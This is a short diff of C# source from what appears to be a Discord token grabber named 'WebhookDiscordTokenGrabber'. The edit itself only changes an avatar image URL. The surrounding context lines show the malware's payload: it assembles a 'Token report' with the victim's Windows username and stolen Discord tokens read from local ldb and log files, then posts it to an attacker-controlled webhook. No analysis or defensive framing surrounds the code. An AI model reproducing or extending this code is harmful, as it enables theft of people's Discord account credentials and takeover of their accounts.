@@ -154,7 +154,7 @@ namespace WebhookDiscordTokenGrabber
                     {
                         { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", writtenldbtoken)}" },
                         { "username", "WDTG by Kai" },
-                        { "avatar_url", "https://cdn.discordapp.com/attachments/737989668242456688/737989908324417607/wdtg_avatar.PNG" }
+                        { "avatar_url", "https://cdn.discordapp.com/attachments/737989668242456688/737995846389596160/wdtg_avatar.PNG" }
                     };
 
                     client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
@@ -178,7 +178,7 @@ namespace WebhookDiscordTokenGrabber
                     {
                         { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", writtenlogtoken)}" },
                         { "username", "WDTG by Kai" },
-                        { "avatar_url", "https://cdn.discordapp.com/attachments/737989668242456688/737989908324417607/wdtg_avatar.PNG" }
+                        { "avatar_url", "https://cdn.discordapp.com/attachments/737989668242456688/737995846389596160/wdtg_avatar.PNG" }
                     };
 
                     client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
